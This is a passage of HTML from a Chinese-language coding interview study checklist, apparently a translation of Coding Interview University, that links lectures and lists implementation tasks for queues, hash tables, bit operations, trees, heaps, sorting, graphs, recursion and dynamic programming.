href="https://archive.org/details/0102WhatYouShouldKnow/05_01-usingStacksForLast-inFirst-out.mp4">使用堆栈 —— 后进先出（视频）</a></li><li>[ ] 可以不实现，因为使用数组来实现并不重要</li></ul></li><li><h3><span id="dui-lie-queue">队列（Queue）</span></h3><ul><li>[ ] <a href="https://archive.org/details/0102WhatYouShouldKnow/05_03-usingQueuesForFirst-inFirst-out.mp4">使用队列 —— 先进先出（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/EShpq/queue">队列（视频）</a></li><li>[ ] <a href="https://en.wikipedia.org/wiki/Circular_buffer">原型队列/先进先出（FIFO）</a></li><li>[ ] <a href="https://archive.org/details/0102WhatYouShouldKnow/05_04-priorityQueuesAndDeques.mp4">优先级队列（视频）</a></li><li>[ ] 使用含有尾部指针的链表来实现:<ul><li>enqueue(value) —— 在尾部添加值</li><li>dequeue() —— 删除最早添加的元素并返回其值（首部元素）</li><li>empty()</li></ul></li><li>[ ] 使用固定大小的数组实现：<ul><li>enqueue(value) —— 在可容的情况下添加元素到尾部</li><li>dequeue() —— 删除最早添加的元素并返回其值</li><li>empty()</li><li>full()</li></ul></li><li>[ ] 花销：<ul><li>在糟糕的实现情况下，使用链表所实现的队列，其入列和出列的时间复杂度将会是 O(n)。因为，你需要找到下一个元素，以致循环整个队列</li><li>enqueue：O(1)（平摊（amortized）、链表和数组 [探测（probing）]）</li><li>dequeue：O(1)（链表和数组）</li><li>empty：O(1)（链表和数组）</li></ul></li></ul></li><li><h3><span id="ha-xi-biao-hash-table">哈希表（Hash table）</span></h3><ul><li><p>[ ] 视频：</p><ul><li>[ ] <a href="https://www.youtube.com/watch?v=0M_kIqhwbFo&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=8">链式哈希表（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=BRO7mVIFt08&amp;index=9&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">Table Doubling 和 Karp-Rabin（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=rvdJDijO2Ro&amp;index=10&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">Open Addressing 和密码型哈希（Cryptographic Hashing）（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=C4Kc8xzcA68">PyCon 2010：The Mighty Dictionary（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=z0lJ2k0sl1g&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=11">（进阶）随机取样（Randomization）：全域哈希（Universal Hashing）&amp; 完美哈希（Perfect Hashing）（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=N0COwN14gt0&amp;list=PL2B4EEwhKD-NbwZ4ezj7gyc_3yNrojKM9&amp;index=4">（进阶）完美哈希（Perfect hashing）（视频）</a></li></ul></li><li><p>[ ] 在线课程：</p><ul><li>[ ] <a href="https://archive.org/details/0102WhatYouShouldKnow/06_02-understandingHashFunctions.mp4">理解哈希函数（视频）</a></li><li>[ ] <a href="https://archive.org/details/0102WhatYouShouldKnow/06_03-usingHashTables.mp4">使用哈希表（视频）</a></li><li>[ ] <a href="https://archive.org/details/0102WhatYouShouldKnow/06_04-supportingHashing.mp4">支持哈希（视频）</a></li><li>[ ] <a href="https://archive.org/details/0102WhatYouShouldKnow/06_05-languageSupportForHashTables.mp4">哈希表的语言支持（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/m7UuP/core-hash-tables">基本哈希表（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/home/week/3">数据结构（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/NYZZP/phone-book-problem">电话薄问题（Phone Book Problem）（视频）</a></li><li>[ ] 分布式哈希表：<ul><li><a href="https://www.coursera.org/learn/data-structures/lecture/DvaIb/instant-uploads-and-storage-optimization-in-dropbox">Dropbox 中的瞬时上传及存储优化（视频）</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/tvH8H/distributed-hash-tables">分布式哈希表（视频）</a></li></ul></li></ul></li><li><p>[ ] 使用线性探测的数组去实现</p><ul><li>hash(k, m) —— m 是哈希表的大小</li><li>add(key, value) —— 如果 key 已存在则更新值</li><li>exists(key)</li><li>get(key)</li><li>remove(key)</li></ul></li></ul></li></ul><h2><span id="geng-duo-de-zhi-shi">更多的知识</span></h2><ul><li><h3><span id="er-fen-cha-zhao-binary-search">二分查找（Binary search）</span></h3><ul><li>[ ] <a href="https://www.youtube.com/watch?v=D5SrAga1pno">二分查找（视频）</a></li><li>[ ] <a href="https://www.khanacademy.org/computing/computer-science/algorithms/binary-search/a/binary-search">二分查找（视频）</a></li><li>[ ] <a href="https://www.topcoder.com/community/data-science/data-science-tutorials/binary-search/">详情</a></li><li>[ ] 实现：<ul><li>二分查找（在一个已排序好的整型数组中查找）</li><li>迭代式二分查找</li></ul></li></ul></li><li><h3><span id="an-wei-yun-suan-bitwise-operations">按位运算（Bitwise operations）</span></h3><ul><li>[ ] <a href="https://github.com/jwasham/coding-interview-university/blob/master/extras/cheat%20sheets/bits-cheat-sheet.pdf">Bits 速查表</a> ── 你需要知道大量2的幂数值（从2^1 到 2^16 及 2^32）</li><li>[ ] 好好理解位操作符的含义：&amp;、|、^、~、&gt;&gt;、&lt;&lt;<ul><li>[ ] <a href="https://en.wikipedia.org/wiki/Word_(computer_architecture)">字码（words）</a></li><li>[ ] 好的介绍：<a href="https://www.youtube.com/watch?v=7jkIUgLC29I">位操作（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=d0AwjSpNXR0">C 语言编程教程 2-10：按位运算（视频）</a></li><li>[ ] <a href="https://en.wikipedia.org/wiki/Bit_manipulation">位操作</a></li><li>[ ] <a href="https://en.wikipedia.org/wiki/Bitwise_operation">按位运算</a></li><li>[ ] <a href="https://graphics.stanford.edu/~seander/bithacks.html">Bithacks</a></li><li>[ ] <a href="http://bits.stephan-brumme.com/">位元抚弄者（The Bit Twiddler）</a></li><li>[ ] <a href="http://bits.stephan-brumme.com/interactive.html">交互式位元抚弄者（The Bit Twiddler Interactive）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ZusiKXcz_ac">位操作技巧（Bit Hacks）（视频）</a></li><li>[ ] <a href="https://pconrad.github.io/old_pconrad_cs16/topics/bitOps/">练习位操作</a></li></ul></li><li>[ ] 一补数和补码<ul><li><a href="https://www.youtube.com/watch?v=lKTsv6iVxV4">二进制：利 &amp; 弊（为什么我们要使用补码）（视频）</a></li><li><a href="https://en.wikipedia.org/wiki/Ones%27_complement">一补数（1s Complement）</a></li><li><a href="https://en.wikipedia.org/wiki/Two%27s_complement">补码（2s Complement）</a></li></ul></li><li>[ ] 计算置位（Set Bits）<ul><li><a href="https://youtu.be/Hzuzo9NJrlc">计算一个字节中置位（Set Bits）的四种方式（视频）</a></li><li><a href="https://graphics.stanford.edu/~seander/bithacks.html#CountBitsSetKernighan">计算比特位</a></li><li><a href="http://stackoverflow.com/questions/109023/how-to-count-the-number-of-set-bits-in-a-32-bit-integer">如何在一个 32 位的整型中计算置位（Set Bits）的数量</a></li></ul></li><li>[ ] 交换值：<ul><li><a href="http://bits.stephan-brumme.com/swap.html">交换（Swap）</a></li></ul></li><li>[ ] 绝对值：<ul><li><a href="http://bits.stephan-brumme.com/absInteger.html">绝对整型（Absolute Integer）</a></li></ul></li></ul></li></ul><h2><span id="shu-trees">树（Trees）</span></h2><ul><li><h3><span id="shu-bi-ji-amp-bei-jing">树 —— 笔记 &amp; 背景</span></h3><ul><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/95qda/trees">系列：树（视频）</a></li><li>基本的树形结构</li><li>遍历</li><li>操作算法</li><li>[ ] <a href="https://www.youtube.com/watch?v=uWL6FJhq5fM">BFS（广度优先检索，breadth-first search）和 DFS（深度优先检索，depth-first search）</a><ul><li>BFS 笔记<ul><li>层序遍历（使用队列的 BFS 算法）</li><li>时间复杂度： O(n)</li><li>空间复杂度：<ul><li>最好情况：O(1)</li><li>最坏情况：O(n/2)=O(n)</li></ul></li></ul></li><li>DFS 笔记：<ul><li>时间复杂度：O(n)</li><li>空间复杂度：<ul><li>最好情况：O(log n) - 树的平均高度</li><li>最坏情况：O(n)</li></ul></li><li>中序遍历（DFS：左、节点本身、右）</li><li>后序遍历（DFS：左、右、节点本身）</li><li>先序遍历（DFS：节点本身、左、右）</li></ul></li></ul></li></ul></li><li><h3><span id="er-cha-cha-zhao-shu-binary-search-trees-bsts">二叉查找树（Binary search trees）：BSTs</span></h3><ul><li>[ ] <a href="https://www.youtube.com/watch?v=x6At0nzX92o&amp;index=1&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6">二叉查找树概览（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/p82sw/core-introduction-to-binary-search-trees">系列（视频）</a><ul><li>从符号表开始到 BST 程序</li></ul></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/E7cXP/introduction">介绍（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=9Jry5-82I68">MIT（视频）</a></li><li>C/C++:<ul><li>[ ] <a href="https://www.youtube.com/watch?v=COZK7NATh4k&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P&amp;index=28">二叉查找树 —— 在 C/C++ 中实现（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=hWokyBoo0aI&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P&amp;index=29">BST 的实现 —— 在堆栈和堆中的内存分配（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=Ut90klNN264&amp;index=30&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P">在二叉查找树中找到最小和最大的元素（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=_pnqMz5nrRs&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P&amp;index=31">寻找二叉树的高度（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=9RHO6jU--GU&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P&amp;index=32">二叉树的遍历 —— 广度优先和深度优先策略（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=86g8jAQug04&amp;index=33&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P">二叉树：层序遍历（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=gm8DUJJhmY4&amp;index=34&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P">二叉树的遍历：先序、中序、后序（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=yEwSGhSsT0U&amp;index=35&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P">判断一棵二叉树是否为二叉查找树（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=gcULXE7ViZw&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P&amp;index=36">从二叉查找树中删除一个节点（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=5cPbNCrdotA&amp;index=37&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P">二叉查找树中序遍历的后继者（视频）</a></li></ul></li><li>[ ] 实现：<ul><li>[ ] insert    // 往树上插值</li><li>[ ] get_node_count // 查找树上的节点数</li><li>[ ] print_values // 从小到大打印树中节点的值</li><li>[ ] delete_tree</li><li>[ ] is_in_tree // 如果值存在于树中则返回 true</li><li>[ ] get_height // 返回节点所在的高度（如果只有一个节点，那么高度则为1）</li><li>[ ] get_min   // 返回树上的最小值</li><li>[ ] get_max   // 返回树上的最大值</li><li>[ ] is_binary_search_tree</li><li>[ ] delete_value</li><li>[ ] get_successor // 返回给定值的后继者，若没有则返回-1</li></ul></li></ul></li><li><h3><span id="dui-heap-you-xian-ji-dui-lie-priority-queue-er-cha-dui-binary-heap">堆（Heap） / 优先级队列（Priority Queue） / 二叉堆（Binary Heap）</span></h3><ul><li>可视化是一棵树，但通常是以线性的形式存储（数组、链表）</li><li>[ ] <a href="https://en.wikipedia.org/wiki/Heap_(data_structure)">堆</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/2OpTs/introduction">介绍（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/z3l9N/naive-implementations">简单的实现（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/GRV2q/binary-trees">二叉树（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/supplement/S5xxz/tree-height-remark">关于树高的讨论（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/0g1dl/basic-operations">基本操作（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/gl5Ni/complete-binary-trees">完全二叉树（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/HxQo9/pseudocode">伪代码（视频）</a></li><li>[ ] <a href="https://youtu.be/odNJmw5TOEE?list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;t=3291">堆排序 —— 跳到起点（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/hSzMO/heap-sort">堆排序（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/dwrOS/building-a-heap">构建一个堆（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=B7hVxCmfPtM&amp;index=4&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">MIT：堆与堆排序（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=yIUFT6AKBGE&amp;index=24&amp;list=PL4BBB74C7D2A1049C">CS 61B Lecture 24：优先级队列（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=MiyLo8adrWw">构建线性时间复杂度的堆（大顶堆）</a></li><li>[ ] 实现一个大顶堆：<ul><li>[ ] insert</li><li>[ ] sift_up —— 用于插入元素</li><li>[ ] get_max —— 返回最大值但不移除元素</li><li>[ ] get_size() —— 返回存储的元素数量</li><li>[ ] is_empty() —— 若堆为空则返回 true</li><li>[ ] extract_max —— 返回最大值并移除</li><li>[ ] sift_down —— 用于获取最大值元素</li><li>[ ] remove(i) —— 删除指定索引的元素</li><li>[ ] heapify —— 构建堆，用于堆排序</li><li>[ ] heap_sort() —— 拿到一个未排序的数组，然后使用大顶堆或者小顶堆进行就地排序</li></ul></li></ul></li></ul><h2><span id="pai-xu-sorting">排序（Sorting）</span></h2><ul><li><p>[ ] 笔记:</p><ul><li>实现各种排序，知道每种排序的最坏、最好和平均的复杂度分别是什么场景:<ul><li>不要用冒泡排序 - 效率太差 - 时间复杂度 O(n^2), 除非 n &lt;= 16</li></ul></li><li>[ ] 排序算法的稳定性 (“快排是稳定的么?”)<ul><li><a href="https://en.wikipedia.org/wiki/Sorting_algorithm#Stability">排序算法的稳定性</a></li><li><a href="http://stackoverflow.com/questions/1517793/stability-in-sorting-algorithms">排序算法的稳定性</a></li><li><a href="http://www.geeksforgeeks.org/stability-in-sorting-algorithms/">排序算法的稳定性</a></li><li><a href="http://homepages.math.uic.edu/~leon/cs-mcs401-s08/handouts/stability.pdf">排序算法 - 稳定性</a></li></ul></li><li>[ ] 哪种排序算法可以用链表？哪种用数组？哪种两者都可？<ul><li>并不推荐对一个链表排序，但归并排序是可行的.</li><li><a href="http://www.geeksforgeeks.org/merge-sort-for-linked-list/">链表的归并排序</a></li></ul></li></ul></li><li><p>关于堆排序，请查看前文堆的数据结构部分。堆排序很强大，不过是非稳定排序。</p></li><li><p>[ ] <a href="https://www.coursera.org/learn/algorithms-part1/home/week/3">Sedgewick ── 归并排序（5个视频）</a></p><ul><li>[ ] 1. 归并排序</li><li>[ ] 2. 自下而上的归并排序</li><li>[ ] 3. 排序复杂度</li><li>[ ] 4. 比较器</li><li>[ ] 5. 稳定性</li></ul></li><li><p>[ ] <a href="https://www.coursera.org/learn/algorithms-part1/home/week/3">Sedgewick ── 快速排序（4个视频）</a></p><ul><li>[ ] 1. 快速排序</li><li>[ ] 2. 选择</li><li>[ ] 3. 重复键值</li><li>[ ] 4. 系统排序</li></ul></li><li><p>[ ] <a href="https://www.youtube.com/watch?v=P00xJgWzz2c&amp;index=1&amp;list=PL89B61F78B552C1AB">冒泡排序（视频）</a></p></li><li><p>[ ] <a href="https://www.youtube.com/watch?v=ni_zk257Nqo&amp;index=7&amp;list=PL89B61F78B552C1AB">冒泡排序分析（视频）</a></p></li><li><p>[ ] <a href="https://www.youtube.com/watch?v=Kg4bqzAqRBM&amp;index=3&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">插入排序 &amp; 归并排序（视频）</a></p></li><li><p>[ ] <a href="https://www.youtube.com/watch?v=c4BRHC7kTaQ&amp;index=2&amp;list=PL89B61F78B552C1AB">插入排序（视频）</a></p></li><li><p>[ ] <a href="https://www.youtube.com/watch?v=GCae1WNvnZM&amp;index=3&amp;list=PL89B61F78B552C1AB">归并排序（视频）</a></p></li><li><p>[ ] <a href="https://www.youtube.com/watch?v=y_G9BkAm6B8&amp;index=4&amp;list=PL89B61F78B552C1AB">快排（视频）</a></p></li><li><p>[ ] <a href="https://www.youtube.com/watch?v=6nDMgr0-Yyo&amp;index=8&amp;list=PL89B61F78B552C1AB">选择排序（视频）</a></p></li><li><p>[ ] 归并排序代码：</p><ul><li>[ ] <a href="http://www.cs.yale.edu/homes/aspnes/classes/223/examples/sorting/mergesort.c">使用外部数组（C语言）</a></li><li>[ ] <a href="https://github.com/jwasham/practice-python/blob/master/merge_sort/merge_sort.py">使用外部数组（Python语言）</a></li><li>[ ] <a href="https://github.com/jwasham/practice-cpp/blob/master/merge_sort/merge_sort.cc">对原数组直接排序（C++）</a></li></ul></li><li><p>[ ] 快速排序代码：</p><ul><li>[ ] <a href="http://www.cs.yale.edu/homes/aspnes/classes/223/examples/randomization/quick.c">实现（C语言）</a></li><li>[ ] <a href="https://github.com/jwasham/practice-c/blob/master/quick_sort/quick_sort.c">实现（C语言）</a></li><li>[ ] <a href="https://github.com/jwasham/practice-python/blob/master/quick_sort/quick_sort.py">实现（Python语言）</a></li></ul></li><li><p>[ ] 实现:</p><ul><li>[ ] 归并：平均和最差情况的时间复杂度为 O(n log n)。</li><li>[ ] 快排：平均时间复杂度为 O(n log n)。</li><li>选择排序和插入排序的最坏、平均时间复杂度都是 O(n^2)。</li><li>关于堆排序，请查看前文堆的数据结构部分。</li></ul></li><li><p>[ ] 有兴趣的话，还有一些补充，但并不是必须的:</p><ul><li><a href="https://www.coursera.org/learn/algorithms-part2/home/week/3">Sedgewick──基数排序 (6个视频)</a><ul><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/vGHvb/strings-in-java">1. Java 中的字符串</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/2pi1Z/key-indexed-counting">2. 键值索引计数（Key Indexed Counting）</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/c1U7L/lsd-radix-sort">3. Least Significant Digit First String Radix Sort</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/gFxwG/msd-radix-sort">4. Most Significant Digit First String Radix Sort</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/crkd5/3-way-radix-quicksort">5. 3中基数快速排序</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/TH18W/suffix-arrays">6. 后继数组（Suffix Arrays）</a></li></ul></li><li>[ ] <a href="http://www.cs.yale.edu/homes/aspnes/classes/223/notes.html#radixSort">基数排序</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=xhr26ia4k38">基数排序（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=Nz1KZXbghj8&amp;index=7&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">基数排序, 计数排序 (线性时间内)（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=cNB2lADK3_s&amp;index=8&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">随机算法: 矩阵相乘, 快排, Freivalds’ 算法（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=pOKy3RZbSws&amp;list=PLUl4u3cNGP61hsJNdULdudlRL493b-XZf&amp;index=14">线性时间内的排序（视频）</a></li></ul></li></ul><p>总结一下，这是<a href="https://www.youtube.com/watch?v=kPRA0W1kECg">15种排序算法</a>的可视化表示。如果你需要有关此主题的更多详细信息，请参阅“<a href="#%E4%B8%80%E4%BA%9B%E4%B8%BB%E9%A2%98%E7%9A%84%E9%A2%9D%E5%A4%96%E5%86%85%E5%AE%B9">一些主题的额外内容</a>”中的“排序”部分。</p><h2><span id="tu-graphs">图（Graphs）</span></h2><p>图论能解决计算机科学里的很多问题，所以这一节会比较长，像树和排序的部分一样。</p><ul><li><p>笔记:</p><ul><li>有4种基本方式在内存里表示一个图:<ul><li>对象和指针</li><li>邻接矩阵</li><li>邻接表</li><li>邻接图</li></ul></li><li>熟悉以上每一种图的表示法，并了解各自的优缺点</li><li>广度优先搜索和深度优先搜索：知道它们的计算复杂度和设计上的权衡以及如何用代码实现它们</li><li>遇到一个问题时，首先尝试基于图的解决方案，如果没有再去尝试其他的。</li></ul></li><li><p>MIT（视频）：</p><ul><li><a href="https://www.youtube.com/watch?v=s-CYnVz-uh4&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=13">广度优先搜索</a></li><li><a href="https://www.youtube.com/watch?v=AfSk24UTFS8&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=14">深度优先搜索</a></li></ul></li><li><p>[ ] Skiena 教授的课程 - 很不错的介绍:</p><ul><li>[ ] <a href="https://www.youtube.com/watch?v=OiXxhDrFruw&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;index=11">CSE373 2012 - 课程 11 - 图的数据结构（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=g5vF8jscteo&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;index=12">CSE373 2012 - 课程 12 - 广度优先搜索（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=S23W6eTcqdY&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;index=13">CSE373 2012 - 课程 13 - 图的算法（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=WitPBKGV0HY&amp;index=14&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">CSE373 2012 - 课程 14 - 图的算法 (1)（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ia1L30l7OIg&amp;index=15&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">CSE373 2012 - 课程 15 - 图的算法 (2)（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=jgDOQq6iWy8&amp;index=16&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">CSE373 2012 - 课程 16 - 图的算法 (3)（视频）</a></li></ul></li><li><p>[ ] 图 (复习和其他):</p><ul><li>[ ] <a href="https://www.youtube.com/watch?v=Aa2sqUhIn-E&amp;index=15&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">6.006 单源最短路径问题（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=2E7MmKv0Y24&amp;index=16&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">6.006 Dijkstra 算法（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ozsuci5pIso&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=17">6.006 Bellman-Ford 算法（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=CHvQ3q_gJ7E&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=18">6.006 Dijkstra 效率优化（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=i_AQT_XfvD8&amp;index=6&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm">Aduni: 图的算法 I - 拓扑排序，最小生成树，Prim 算法 - 第六课（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ufj5_bppBsA&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=7">Aduni: 图的算法 II - 深度优先搜索, 广度优先搜索, Kruskal 算法, 并查集数据结构 - 第七课（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=DiedsPsMKXc&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=8">Aduni: 图的算法 III: 最短路径 - 第八课（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=XIAQRlNkJAw&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=9">Aduni: 图的算法. IV: 几何算法介绍 - 第九课（视频）</a></li><li>[ ] <del><a href="https://youtu.be/dgjX4HdMI-Q?list=PL-XXv-cvA_iAlnI-BQr9hjqADPBtujFJd&amp;t=3489">CS 61B 2014 (从 58:09 开始)（视频）</a></del></li><li>[ ] <a href="https://www.youtube.com/watch?v=aJjlQCFwylA&amp;list=PL-XXv-cvA_iAlnI-BQr9hjqADPBtujFJd&amp;index=19">CS 61B 2014: 加权图（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=tKwnms5iRBU&amp;index=16&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">贪心算法: 最小生成树（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=RpgcYiky7uw">图的算法之强连通分量 Kosaraju 算法（视频）</a></li></ul></li><li><p>完整的 Coursera 课程:</p><ul><li>[ ] <a href="https://www.coursera.org/learn/algorithms-on-graphs/home/welcome">图的算法（视频）</a></li></ul></li><li><p>我会实现:</p><ul><li>[ ] DFS 邻接表 (递归)</li><li>[ ] DFS 邻接表 (栈迭代)</li><li>[ ] DFS 邻接矩阵 (递归)</li><li>[ ] DFS 邻接矩阵 (栈迭代)</li><li>[ ] BFS 邻接表</li><li>[ ] BFS 邻接矩阵</li><li>[ ] 单源最短路径问题 (Dijkstra)</li><li>[ ] 最小生成树</li><li>基于 DFS 的算法 (根据上文 Aduni 的视频):<ul><li>[ ] 检查环 (我们会先检查是否有环存在以便做拓扑排序)</li><li>[ ] 拓扑排序</li><li>[ ] 计算图中的连通分支</li><li>[ ] 列出强连通分量</li><li>[ ] 检查双向图</li></ul></li></ul></li></ul><p>可以从 Skiena 的书（参考下面的书推荐小节）和面试书籍中学习更多关于图的实践。</p><h2><span id="geng-duo-zhi-shi">更多知识</span></h2><ul><li><h3><span id="di-gui-recursion">递归（Recursion）</span></h3><ul><li>[ ] Stanford 大学关于递归 &amp; 回溯的课程:<ul><li>[ ] <a href="https://www.youtube.com/watch?v=gl3emqCuueQ&amp;list=PLFE6E58F856038C69&amp;index=8">课程 8 | 抽象编程（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=uFJhEPrbycQ&amp;list=PLFE6E58F856038C69&amp;index=9">课程 9 | 抽象编程（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=NdF1QDTRkck&amp;index=10&amp;list=PLFE6E58F856038C69">课程 10 | 抽象编程（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=p-gpaIGRCQI&amp;list=PLFE6E58F856038C69&amp;index=11">课程 11 | 抽象编程（视频）</a></li></ul></li><li>什么时候适合使用</li><li>尾递归会更好么?<ul><li>[ ] <a href="https://www.quora.com/What-is-tail-recursion-Why-is-it-so-bad">什么是尾递归以及为什么它如此糟糕?</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=L1jjXGfxozc">尾递归（视频）</a></li></ul></li></ul></li><li><h3><span id="dong-tai-gui-hua-dynamic-programming">动态规划（Dynamic Programming）</span></h3><ul><li>在你的面试中或许没有任何动态规划的问题，但能够知道一个题目可以使用动态规划来解决是很重要的。</li><li>这一部分会有点困难，每个可以用动态规划解决的问题都必须先定义出递推关系，要推导出来可能会有点棘手。</li><li>我建议先阅读和学习足够多的动态规划的例子，以便对解决 DP 问题的一般模式有个扎实的理解。</li><li>[ ] 视频:<ul><li>Skiena 的视频可能会有点难跟上，有时候他用白板写的字会比较小，难看清楚。</li><li>[ ] <a href="https://youtu.be/Qc2ieXRgR0k?list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;t=1718">Skiena: CSE373 2012 - 课程 19 - 动态规划介绍（视频）</a></li><li>[ ] <a href="https://youtu.be/IsmMhMdyeGY?list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;t=2749">Skiena: CSE373 2012 - 课程 20 - 编辑距离（视频）</a></li><li>[ ] <a href="https://youtu.be/o0V9eYF4UI8?list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;t=406">Skiena: CSE373 2012 - 课程 21 - 动态规划举例（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=dRbMC1Ltl3A&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;index=22">Skiena: CSE373 2012 - 课程 22 - 动态规划应用（视频）</a></li><li>[ ] <a href="https://youtu.be/J5aJEcOr6Eo?list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;t=3558">Simonson: 动态规划 0 